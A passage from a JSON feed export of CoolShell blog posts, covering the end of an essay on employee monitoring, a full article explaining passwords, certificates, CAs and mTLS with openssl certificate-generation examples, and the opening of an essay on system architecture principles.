Reuters，这家公司主要是卖金融数据的，所以，对信息泄漏是非常注重的，其就是需要在员工的电脑上安装监控软件。</p>\n<p>还有一些劳动密集型的工作，比如在Amazon里的仓库里工作的人，公司会监控员工的工作量，以此来评估员工的工作绩效。对于用监控软件来评估程序员的工作量，我到今天仅见过监控外包人员的，在中国，外包人员需要使用甲方的电脑进行签到和签退，以及相关的工作。除了上述的信息安全目前，还能够看到员工的工作时长的情况。</p>\n<p><strong>所以，一般来说，公司监控的目的主要是为了自己的信息安全，还有员工的工作量评估，一般来说，不会涉及员工的隐私</strong>。</p>\n<p>但是，随着收集的数据越来越多，有些公司发现还可以做更多的事，比如，上述的员工离职倾向的分析。<strong>还有一些公司还会收集员工在外网的数据，比如你在社交平台上的各种言论，来分析你对公司的忠诚度和你的价值观取向……</strong>我个人觉得这些已经令人不耻了。</p>\n<h4>外企与国企不同之处</h4>\n<p>我经历过的公司中，外国公司和中国公司都有监控的经历，这里说一下他们的不一样之处。<strong>最大的不一样的地方是，外国公司会让你有知情权，而中国公司则完全没有</strong>。</p>\n<p>我记得我进入Thomson Reuters 公司的时候，公司要求签署一份监控的知情的同意书，其中用中英文写的，就是说，你授权公司监控你的如下这些信息：1）上网记录，2）下载的软件，3）工作电脑，4）公司的座机电话，5）会议室和办公区的语音和视频监控……大概有两页A4纸，然后也说明了这些数据公司仅用于信息安全的风控，不用于个人隐私分析等等……并且会符合法律要求保护员工的这些数据不外泄……这些条款都经得起法律的推敲。这样的协议是需要员工签字的，并且对双方都有法律约束的。</p>\n<p>中国的公司则不会告诉你他们会监控你哪些数据，而这些数据拿来做什么。 我记得我在某公司工作的时候，就有员工发现自己访问自己的gmail的录屏被公司收集后的愤怒……</p>\n<h4>我对此事的看法</h4>\n<p>一方面，我对于公司通过使用监控软件监控员工的行为我是能够理解的，但是，<strong>应该让员工有知情权，并和员工明确一个监控的信息和范围，包括收集的数据的用途和安全措施，以及数据多长时间销毁的协议。</strong>如果没有这个协议的话，我觉得本质上就是一种流氓行为。</p>\n<p>另一方面，针对监控员离职的倾向来说，我实在不知道有什么意义？公司你知道了又能如何呢？你是要找员工作思想工作，还是要给员工更好的待遇，还是直接开掉？<strong>如果你对自己的企业有信心，你就不必担心员工会离开，如果你的企业有问题，你为什么不把心思花在建设自己的企业上来呢？安装这样的监控软件对于企业没有什么帮助，反而只会让你的企业的形象更low……</strong></p>\n<p>再仔细想想，<strong>员工有一万种方法泄漏你公司的信息，无论你怎么监控，只要他想，他总是能够找到方法的，不是么？如何让找到或是培养有职业操守的员工，如何管理自己企业的商业信息，如何建立一个更好的企业文化让员工更有归属感，成为企业的共同体，一同维护共同利益，为企业着想，这不才是公司真正应该干的事吗？！</strong>监控员工充分暴露了这样的企业没有一个好的企业文化，不懂得高级的管理，所以，只能靠监控这样的手段来管理企业了……这样的企业不去也罢了。</p>\n<p>（全文完）<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/22298.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2022/10/communication-150x150.png\" alt=\"聊聊团队协同和协同工具\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/22298.html\" class=\"wp_rp_title\">聊聊团队协同和协同工具</a></li><li ><a href=\"https://coolshell.cn/articles/22173.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2022/02/http_method-150x150.png\" alt=\"“一把梭：REST API 全用 POST”\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/22173.html\" class=\"wp_rp_title\">“一把梭：REST API 全用 POST”</a></li><li ><a href=\"https://coolshell.cn/articles/21589.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2021/07/knowledge_sharing-300x169-1-150x150.jpeg\" alt=\"如何做一个有质量的技术分享\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21589.html\" class=\"wp_rp_title\">如何做一个有质量的技术分享</a></li><li ><a href=\"https://coolshell.cn/articles/20977.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/08/programmer.01-e1596792460687-150x150.png\" alt=\"程序员如何把控自己的职业\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/20977.html\" class=\"wp_rp_title\">程序员如何把控自己的职业</a></li><li ><a href=\"https://coolshell.cn/articles/20765.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/01/remote-150x150.jpg\" alt=\"MegaEase的远程工作文化\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/20765.html\" class=\"wp_rp_title\">MegaEase的远程工作文化</a></li><li ><a href=\"https://coolshell.cn/articles/20276.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/12/open-your-creative-mind-150x150.jpg\" alt=\"别让自己“墙”了自己\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/20276.html\" class=\"wp_rp_title\">别让自己“墙”了自己</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/22157.html\">谈谈公司对员工的监控</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "技术新闻",
          "link": "https://coolshell.cn/articles/22157.html",
          "creator": "陈皓",
          "pubDate": "Sat, 12 Feb 2022 07:50:06 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "697f3a3381686e73cb7810ba6dd2db9c",
          "highlights": []
        },
        {
          "title": "网络数字身份认证术",
          "description": "<p>这篇文章是《HTTP API 认证授权术》的姊妹篇，在那篇文章中，主要介绍了 HTTP API 认证和授权技术中用到的 HTTP Basic, Digest A...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/21708.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/21708.html\">网络数字身份认证术</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright size-medium wp-image-21716\" src=\"https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114-300x201.png\" alt=\"\" width=\"300\" height=\"201\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114-300x201.png 300w, https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114-768x514.png 768w, https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114-404x270.png 404w, https://coolshell.cn/wp-content/uploads/2022/01/iStock-1175502114.png 800w\" sizes=\"(max-width: 300px) 100vw, 300px\" />这篇文章是《<a title=\"HTTP API 认证授权术\" href=\"https://coolshell.cn/articles/19395.html\" target=\"_blank\" rel=\"noopener\">HTTP API 认证授权术</a>》的姊妹篇，在那篇文章中，主要介绍了 HTTP API 认证和授权技术中用到的 HTTP Basic, Digest Access, HMAC, OAuth, JWT 等各种方式，主要是 API 上用到的一些技术，这篇文章主要想说的是另一个话题——身份认证。也就是说，怎么确认这个数据就是这个人发出来的？</p>\n<h4>用户密码</h4>\n<p>要解决这个问题，我们先来看一个最简单的解——使用密码，通常来说，在网络上要证明一个人的身份的话，都需要这个人的一些私密而唯一的东西。比如，像密码这样的东西，很多地方，只要你提供了你的用户名+密码，就可以确定这个人是你（注明：关于密码管理，强密码设定，密码泄漏，密码破解以及密码哄骗不在这篇文章的话题中），也就是说，这个密码是非常私密的事，我们可以假设，这个事全世界只能有当事人一个人知道，所以，当事人得供正确的密码，我们就可以认证这个人了。</p>\n<p>为了加强密码的安全程度，一般会使用 2FA（Two-factor authentication）或 MFA（Multi-factor authentication），双因认证或多因认证，这需要用户提供一个唯一的可信设备，比如用户的手机，然后通过验证手机短信，或是像 <a href=\"https://en.wikipedia.org/wiki/Google_Authenticator\" target=\"_blank\" rel=\"noopener\">Google Authenticator</a>  这样的动态口令来完成。这样的安全级别已经算是比较高了。如果能够再加上经常性的变更密码，那么安全级别就更好了。</p>\n<p><span id=\"more-21708\"></span></p>\n<p>另外，一些公司还使用了生物密码来进行用户的身份验证，比如人脸识别。但是，我个人觉得人脸识别或是生物识别是比较糟糕的方式，因为：</p>\n<ul>\n<li>目前能被验证的生物信息（如人脸和指纹）太容易被别人获得和伪造了。</li>\n<li>这样东西不能被变更和吊销，密码可以被吊销和重置，人脸则不能。</li>\n</ul>\n<h4>密钥对和证书</h4>\n<p>密码可以解决身证认证的问题有很多问题，最重要的一个问题就是，你要把你的密码提供给对方，对方才能验证你的身份。你不可能把你的密码提供给全世界的人吧，这样的话，全世界的人都有你的密码了，那么任何人都能变成你了。所以，用户密码这个事只能存在于权威机构和普通用户之间，不能存在于普遍应用中。所以，这里需要使用更好的解决方案。</p>\n<p>使用 ECC（<a title=\"Elliptic-Curve Cryptography\" href=\"https://en.wikipedia.org/wiki/Elliptic-curve_cryptography\" target=\"_blank\" rel=\"noopener\">Elliptic-Curve Cryptography</a>）椭圆曲线密码术，可以通过一个“密钥对”进行非对称加密。这种技术，在对信息进行加密和解密时，使用两个不同的密钥，其中一个用来做加密，另一个做解密。这样一来，我们就可以把其中一个密钥公布出去，称之为公钥，另一个密钥私密地保管好，称之为私钥。</p>\n<p>比如，我用我的私钥加密信息，然后，我把这个私钥所配对的公钥发布给所有人，大家都用公钥解密信息，不用我的公钥你解密不了这个信息。这样一来，就可以保证这个信息是我发出来的，不但保证了信息安全，还完成了身份认证。</p>\n<p><img decoding=\"async\" loading=\"lazy\" class=\"aligncenter size-large wp-image-21710\" src=\"https://coolshell.cn/wp-content/uploads/2022/01/key.pair_-1024x390.png\" alt=\"\" width=\"640\" height=\"244\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/01/key.pair_-1024x390.png 1024w, https://coolshell.cn/wp-content/uploads/2022/01/key.pair_-300x114.png 300w, https://coolshell.cn/wp-content/uploads/2022/01/key.pair_-768x293.png 768w, https://coolshell.cn/wp-content/uploads/2022/01/key.pair_-604x230.png 604w, https://coolshell.cn/wp-content/uploads/2022/01/key.pair_.png 1304w\" sizes=\"(max-width: 640px) 100vw, 640px\" /></p>\n<p>这样的现实案例一般用于网站，也就是用户得要知道我访问的这个网站是真实的，不是别人做的。因为 DNS 很容易被 hack，你连上一个不可信的网络，这个网络里的 DNS 把这个网站的 IP 地址解析成什么 就是什么了。但是有了这个加密的机制后，网站把自己的信息加密后连同公钥给到访问者，访问解密后就知道是不是这个网站了。</p>\n<p>但是，这里还是会有一个很严重的问题，那就是中间人攻击。如下图所示：</p>\n<p><img decoding=\"async\" loading=\"lazy\" class=\"aligncenter wp-image-21712 size-full\" src=\"https://coolshell.cn/wp-content/uploads/2022/01/middle.man_-e1641105543137.png\" alt=\"\" width=\"600\" height=\"252\" /></p>\n<p>中间人 Chad 把自己伪装成 Bob 向 Alice 要信息，然后，再伪装成 Alice 对 Bob 说，这就是 Alice 的公钥，于是 Bob 也无法验证是不是 Alice 的公钥，因为公钥里就是一堆乱七八糟的数据，我们完全不能分辨哪个公钥属于 Alice 的。试想，如果我们收到声称属于银行的密钥。我们怎么知道它确实属于你的银行？</p>\n<p>这里的答案就是<strong>使用数字证书</strong>。证书跟我们的身份证非常类似，其需要一个可信机构来颁发和验证的。这个证书机构 CA（Certificate Authority）是一个是大家都相信的权威机构，他用他的人品保证（当然一般会被严格管理和审计），CA 机构同样使用这样的非对称加密的技术来完成颁发和验证的事。下图展示了这一过程。</p>\n<p><img decoding=\"async\" loading=\"lazy\" class=\"aligncenter size-large wp-image-21713\" src=\"https://coolshell.cn/wp-content/uploads/2022/01/certificate-1024x532.png\" alt=\"\" width=\"640\" height=\"333\" srcset=\"https://coolshell.cn/wp-content/uploads/2022/01/certificate-1024x532.png 1024w, https://coolshell.cn/wp-content/uploads/2022/01/certificate-300x156.png 300w, https://coolshell.cn/wp-content/uploads/2022/01/certificate-768x399.png 768w, https://coolshell.cn/wp-content/uploads/2022/01/certificate-519x270.png 519w, https://coolshell.cn/wp-content/uploads/2022/01/certificate.png 1362w\" sizes=\"(max-width: 640px) 100vw, 640px\" /></p>\n<p>说明一下上面这个图：</p>\n<ol>\n<li>为了解决公钥认证的问题的，我们需要一个权威的CA 机构。</li>\n<li>Alice 把自己的信息（姓名、组织，地址，电邮，网址等）和自己的公钥打包成一个 CSR 的文件，发给 CA 机构，</li>\n<li>CA 机构会来找 Alice 做物理世界的认证，如果通过后，就会用自己的机构私钥，把CSR 变成一个签名证书。</li>\n<li>Bob 同学拿到 Alice 的证书，用 CA 机构的公钥解密后，得到 Alice 的公钥</li>\n<li>后面就可以签证 信息是否来自 Alice 了。</li>\n</ol>\n<p>是的，这个过程就是在“套娃”，这种证书机构还可以给下级的证书机构发证，于是就会一层套一层地，形成一个证书链，顶层的叫根证书，你得绝对信任之。对于验证证书真实性的客户端，它需要能够验证链中所有 CA 的签名，这意味着客户端需要访问链中所有 CA 的证书。</p>\n<h4>证书生成过程演示</h4>\n<p>并不是所有的场景都需要向这些大型的 CA 机构申请公钥证书，在任何一个企业，组织或是团体内都可以自己形这样的“小王国”，也就是说，你可以自行生成这样的证书，只需要你自己保证自己的生成证书的私钥的安全，以及不需要扩散到整个互联网。下面，我们用 <code>openssl</code>命令来演示这个过程。</p>\n<p>1）生成 CA 的证书（公钥） <code>ca.crt</code> 和私钥 <code>ca.key</code></p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">openssl req -newkey rsa:2048 \\\n    -new -nodes -x509 \\\n    -days 365 \\\n    -out ca.crt \\\n    -keyout ca.key \\\n    -subj \"/C=SO/ST=Earth/L=Mountain/O=CoolShell/OU=HQ/CN=localhost\"</pre>\n<p>2)  生成 alice 的私钥</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">openssl genrsa -out alice.key 2048</pre>\n<p>3）生成 Alice 的 CSR &#8211; Certificate Signing Request</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">openssl req -new -key alice.key 365 -out alice.csr \\\n    -subj \"/C=CN/ST=Beijing/L=Haidian/O=CoolShell/OU=Test/CN=localhost.alice\"</pre>\n<p>4）使用 CA 给 Alice 签名证书</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">openssl x509  -req -in alice.csr \\\n    -extfile &lt;(printf \"subjectAltName=DNS:localhost.alice\") \\ \n    -CA ca.crt -CAkey ca.key  \\\n    -days 365 -sha256 -CAcreateserial \\\n    -out alice.crt</pre>\n<h4>双向认证 mTLS</h4>\n<p>上面，我们说的基本上都是单向认证，大量的场景都是确保用户方访问的是真正的服务方，如：银行，电商网站，等。这样可以保证用户不会被钓鱼网站或是中间人攻击。但是，很多时候，我们也是需要双向认证的。下面是一个典型的场景——微信支付和商户间交互</p>\n<ul>\n<li>用户到商家那边买东西，商家要求用户进行支付。</li>\n<li>用户选择了微信支付，于是，界面从商户侧切到了微信侧</li>\n<li>微信那边支付完成后，商户这边收到微信那边支付完成的通知，于是开始发货。</li>\n</ul>\n<p>这个过程中有件事非常重要——就是微信通知商户支付完成的时候。</p>\n<ul>\n<li>微信得确保通知到的就是用户所支付商户，而不是别个。</li>\n<li>商户也得要能确认，来通知我的就是微信，不是别人。</li>\n</ul>\n<p>一般来说，微信会给商户一个 AppID和一个 AppSerct，用这个来确保是我认证过的商户来调用我，然后，需要商户在自己的系统里填一个回调的 URL，并通过平台设置的 key来做 MD5/HMAC的签名来确保是官方的回调。这都是在《<a title=\"HTTP API 认证授权术\" href=\"https://coolshell.cn/articles/19395.html\" target=\"_blank\" rel=\"noopener\">HTTP API 认证授权术</a>》中提到过的技术，是相对传统的技术。</p>\n<p>如今，<b>mTLS是</b>确保云原生应用程序中服务之间的通信安全的首选协议。 也就是双向认证。</p>\n<p>传统的 TLS 认证过程是：</p>\n<ol dir=\"auto\">\n<li>客户端连接到服务器</li>\n<li>服务器提供其 TLS 证书</li>\n<li>客户端验证服务器的证书</li>\n<li>客户端和服务器通过加密的 TLS 连接交换信息</li>\n</ol>\n<p dir=\"auto\">在 mTLS 中，客户端和服务器都有一个证书，双方都使用他们的公钥/私钥对进行身份验证。与常规 TLS 相比，mTLS 中有额外的步骤来验证双方（以<strong>粗体显示的</strong>额外步骤）：</p>\n<ol dir=\"auto\">\n<li>客户端连接到服务器</li>\n<li>服务器提供其 TLS 证书</li>\n<li>客户端验证服务器的证书</li>\n<li><strong>客户端出示其 TLS 证书</strong></li>\n<li><strong>服务器验证客户端的证书</strong></li>\n<li><strong>服务器授予访问权限</strong></li>\n<li>客户端和服务器通过加密的 TLS 连接交换信息</li>\n</ol>\n<p>mTLS 需要“根”TLS 证书；这我们自己来完成证书颁发机构的职责。授权客户端和服务器使用的证书必须与此根证书相对应。根证书是自签名的，这意味着我们需要自己创建它。（注：此方法不适用于公共 Internet 上的单向 TLS，因为外部证书颁发机构必须颁发这些证书）</p>\n<p>那么，为什么整个互联网上都用了 TLS 了，为什么 不升级一下使用 mTLS？这里有两方面的原因：</p>\n<ul>\n<li>公共互联网上要解决的问题是：A) 确保用户访问到的是正确的网站，而不是钓鱼网站。B）网站传输的内容是安全和私密且不会被篡改的。</li>\n<li>将 TLS 证书分发到所有最终用户设备将非常困难。生成、管理和验证为此所需的数十亿个证书几乎是不可能的任务。</li>\n</ul>\n<p>在较小的范围内，mTLS 对于单个组织非常有用且非常实用，尤其是当这些组织采用零信任方法来确保网络安全时。由于默认情况下零信任方法不信任任何用户、设备或请求，因此组织必须能够在每次尝试访问网络中的任何点时对每个用户、设备和请求进行身份验证。mTLS 通过对用户进行身份验证和设备验证来帮助实现这一目标。</p>\n<p>关于 mTLS，这里有一个我用 Golang 写的示例 &#8211; <a href=\"https://github.com/haoel/mTLS\" target=\"_blank\" rel=\"noopener\">https://github.com/haoel/mTLS</a>，大家可以参考一下。</p>\n<p>P.S. 本文图版中的卡司来自安全圈的标准 Cast，参看<a href=\"https://en.wikipedia.org/wiki/Alice_and_Bob\" target=\"_blank\" rel=\"noopener\"> Alice and Bob</a>。</p>\n<p>（全文完）<!--\n\n\n\n<p align=\"center\"><a href= target=_blank><img decoding=\"async\" src=\"\"></a></p>\n\n\n\n\n\n<p align=\"center\"><img decoding=\"async\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg\"> <img decoding=\"async\" loading=\"lazy\" src=\"https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg\" width=\"300\" height=\"300\"> <br />关注CoolShell微信公众账号和微信小程序</p>\n\n \n\n--></p>\n<div style=\"margin-top: 15px; font-size: 16px;color: #cc0000;\">\n<p align=\"center\"><strong>（转载本站文章请注明作者和出处 <a href=\"https://coolshell.cn/\">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>\n</div>\n\n<div class=\"wp_rp_wrap  wp_rp_vertical_m\" ><div class=\"wp_rp_content\"><h3 class=\"related_post_title\">相关文章</h3><ul class=\"related_post wp_rp\"><li ><a href=\"https://coolshell.cn/articles/19395.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/05/Authorization-360x200-1-150x150.png\" alt=\"HTTP API 认证授权术\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/19395.html\" class=\"wp_rp_title\">HTTP API 认证授权术</a></li><li ><a href=\"https://coolshell.cn/articles/21003.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2020/06/time-bomb-150x150.png\" alt=\"计时攻击 Timing Attacks\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/21003.html\" class=\"wp_rp_title\">计时攻击 Timing Attacks</a></li><li ><a href=\"https://coolshell.cn/articles/19840.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2019/10/HTTP-770x513-300x200-1-150x150.jpg\" alt=\"HTTP的前世今生\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/19840.html\" class=\"wp_rp_title\">HTTP的前世今生</a></li><li ><a href=\"https://coolshell.cn/articles/18094.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2017/08/enable-https-banner-150x150.png\" alt=\"如何免费的让网站启用HTTPS\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/18094.html\" class=\"wp_rp_title\">如何免费的让网站启用HTTPS</a></li><li ><a href=\"https://coolshell.cn/articles/17607.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2017/01/MongoDB-150x150.jpg\" alt=\"从 MongoDB “赎金事件” 看安全问题\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/17607.html\" class=\"wp_rp_title\">从 MongoDB “赎金事件” 看安全问题</a></li><li ><a href=\"https://coolshell.cn/articles/17066.html\" class=\"wp_rp_thumbnail\"><img src=\"https://coolshell.cn/wp-content/uploads/2015/04/phishing-1-150x150.jpg\" alt=\"关于移动端的钓鱼式攻击\" width=\"150\" height=\"150\" /></a><a href=\"https://coolshell.cn/articles/17066.html\" class=\"wp_rp_title\">关于移动端的钓鱼式攻击</a></li></ul></div></div>The post <a href=\"https://coolshell.cn/articles/21708.html\">网络数字身份认证术</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "category": "程序设计",
          "link": "https://coolshell.cn/articles/21708.html",
          "creator": "陈皓",
          "pubDate": "Sun, 02 Jan 2022 08:38:13 +0000",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "zh",
          "folder": "rip",
          "feed": "coolshell",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "73b7ceb8bbe992bc9d1dd1e464327553",
          "highlights": []
        },
        {
          "title": "我做系统架构的一些原则",
          "description": "<p>工作 20 多年了，这 20 来年看到了很多公司系统架构，也看到了很多问题，在跟这些公司进行交流和讨论的时候，包括进行实施和方案比较的时候，都有很多各种方案的比...</p>\n<p class=\"read-more\"><a class=\"btn btn-default\" href=\"https://coolshell.cn/articles/21672.html\"> Read More<span class=\"screen-reader-text\">  Read More</span></a></p>\nThe post <a href=\"https://coolshell.cn/articles/21672.html\">我做系统架构的一些原则</a> first appeared on <a href=\"https://coolshell.cn\">酷 壳 - CoolShell</a>.",
          "content": "<p><script async src=\"https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158\"\n     crossorigin=\"anonymous\"></script><img decoding=\"async\" loading=\"lazy\" class=\"alignright size-full wp-image-21682\" src=\"https://coolshell.cn/wp-content/uploads/2021/12/bachelor-mechanical-eng-icon@72x.png\" alt=\"\" width=\"250\" height=\"250\" srcset=\"https://coolshell.cn/wp-content/uploads/2021/12/bachelor-mechanical-eng-icon@72x.png 250w, https://coolshell.cn/wp-content/uploads/2021/12/bachelor-mechanical-eng-icon@72x-150x150.png 150w\" sizes=\"(max-width: 250px) 100vw, 250px\" />工作 20 多年了，这 20 来年看到了很多公司系统架构，也看到了很多问题，在跟这些公司进行交流和讨论的时候，包括进行实施和方案比较的时候，都有很多各种方案的比较和妥协，因为相关的经历越来越多，所以，逐渐形成了自己的逻辑和方法论。今天，想写下这篇文章，把我的这些个人的经验和想法总结下来，希望能够让更多的人可以参考和借鉴，并能够做出更好的架构来。另外，我的这些思维方式和原则都针对于现有市面上众多不合理的架构和方案，所以，也算是一种“纠正”……（注意，这篇文章所说的这些架构上的原则，一般适用于相对比较复杂的业务，如果只是一些简单和访问量不大的应用，那么你可能会得出相反的结论）</p>\n<h4>原则一：关注于真正的收益而不是技术本身</h4>\n<p>对于软件架构来说，我觉得第一重要的是架构的收益，如果不说收益，只是为了技术而技术，而没有任何意义。对于技术收益来说，我觉得下面这几个收益是非常重要的：</p>\n<ul>\n<li><strong>是否可以降低技术门槛加快整个团队的开发流程</strong>。能够加快整个团队的工程流程，快速发布，是软件工程一直在解决的问题，所以，系统架构需要能够进行并行开发，并行上线和并行运维，而不会让某个团队成为瓶颈点。（注：就算拖累团队的原因是组织构架，也不妨碍我们做出并行的系统架构设计）</li>\n<li><strong>是否可以让整个系统可以运行的更稳定</strong>。要让整个系统可以运行的更为的稳定，提升整个系统的 SLA，就需要对有计划和无计划的停机做相应的解决方案（参看《<a title=\"关于高可用的系统\" href=\"https://coolshell.cn/articles/17459.html\" target=\"_blank\" rel=\"noopener\">关于高可用的架构</a>》）</li>\n<li><strong>是否可以通过简化和自动化降低成本</strong>。最高优化的成本是人力成本，人的成本除了慢和贵，还有经常不断的 human error。如果不能降低人力成本，反而需要更多的人，那么这个架构设计一定是失败的。除此之外，是时间成本，资金成本。</li>\n</ul>\n<p>如果一个系统架构不能在上面三个事上起到作用，那就没有意义了。</p>\n<p><span id=\"more-21672\"></span></p>\n<h4>原则二：以应用服务和 API 为视角，而不是以资源和技术为视角</h4>\n<p>国内很多公司都会有很多分工，基本上都会分成运维和开发，运维又会分成基础运维和应用运维，开发则会分成基础核心开发和业务开发。不同的分工会导致完全不同的视角和出发点。比如，基础运维和开发的同学更多的只是关注资源的利用率和性能，而应用运维和业务开发则更多关注的是应用和服务上的东西。这两者本来相关无事，但是因为分布式架构的演进，导致有一些系统已经说不清楚是基础层的还是应用层的了，比如像服务治理上的东西，里面即有底层基础技术，也需要业务的同学来配合，包括 k8s 也样，里面即有底层的如网络这样的技术，也有需要业务配合的 readniess和 liveness 这样的健康检查，以及业务应用需要 configMap 等等 ……</p>\n<p><strong>这些东西都让我感觉到所谓 DevOps，其实就是因为很多技术和组件已经分不清是 Dev 还是 Ops 的了，所以，需要合并 Dev和 Ops</strong>。而且，整个组织和架构的优化，已经不能通过调优单一分工或是单一组件能够有很大提升的了。其需要有一种自顶向下的，整体规划，统一设计的方式，才能做到整体的提升（可以试想一下城市交通的优化，当城市规模到一定程度的时候，整体的性能你是无法通过优化几条路或是几条街区来完成的，你需要对整个城市做整体的功能体的规划才可能达到整体效率的提升）。而为了做到整体的提升，需要所有的人都要有一个统一的视角和目标，这几年来，我觉得这个目标就是——<strong>要站在服务和 对外API的视角来看问题，而不是技术和底层的角度。</strong></p>\n<h4>原则三：选择最主流和成熟的技术</h4>\n<p>技术选型是一件很重要的事，技术一旦选错，那会导致整个架构需要做调整，而对架构的调整重来都不是一件简单的事，我在过去几年内，当系统越来越复杂的时候，用户把他们的  PHP，Python, .NET，或 Node.js 的架构完全都迁移到 Java + Go 的架构上来的案例不断的发生。这个过程还是非常痛苦的，但是你没有办法，当你的系统越来越复杂，越来越大时，你就再也不能在一些玩具技术上玩了，你需要的更为工业化的技术。</p>\n<ul>\n<li><strong>尽可能的使用更为成熟更为工业化的技术栈，而不是自己熟悉的技术栈</strong>。 所谓工业化的技术栈，你可以看看大多数公司使用的技术栈，比如：互联网，金融，电信……等等 ，大公司会有更多的技术投入，也需要更大规模的生产，所以，他们使用的技术通常来说都是比较工业化的。在技术选型上，千万不要被——“你看某个视频公司也在用这个技术”，或是一些在论坛上看到的一些程序员吐槽技术的观点（没有任何的数据，只有自己的喜好）来决定自己的技术，还是看看主流大多数公司实际在用的技术栈，会更靠谱一些。</li>\n<li><strong>选择全球流行的技术，而不是中国流行的技术</strong>。技术这个东西一定是一个全球化的东西，不是一个局域化的事。所以，一定要选国际化的会更好。另外，千万不要被某些公司的“特别案例”骗过去了，那怕这个案例很性感，关键还是要看解决问题的思路和采用的技术是否具有普世性。只有普世性的技术有更强的生命力。</li>\n<li><strong>尽可能的使用红利大的主流技术，而不要自己发明轮子，更不要魔改</strong>。我见过好些个公司魔改开源软件，比如有个公司同魔改mesos，最后改着改着发现自己发明另一个 kubernetes。我还见过很多公司或技术团队喜欢自己发明自己的专用轮子，最后都会被主流开源软件所取代。完全没有必要。不重新发明轮子，不魔改，不是因为自己技术不能，而是因为，这个世界早已不是自己干所有事的年代了，这个时代是要想尽方法跟整个产业，整个技术社区融合和合作，这样才会有最大的收益。那些试图因为某个特例需要自成一套的玩法，短期没问题，但长期来说，我都不看好。</li>\n<li><strong>绝大多数情况下，如无非常特殊要求，选 Java基本是不会错的</strong>。一方面，这是因为 Java 的业务开发的生产力是非常好的，而且有 Spring 框架保障，代码很难写烂，另外，Java 的社区太成熟了，你需要的各种架构和技术都可以很容易获得，技术红利实在是太大。这种运行在JVM上的语言有太多太多的好处了。在 Java 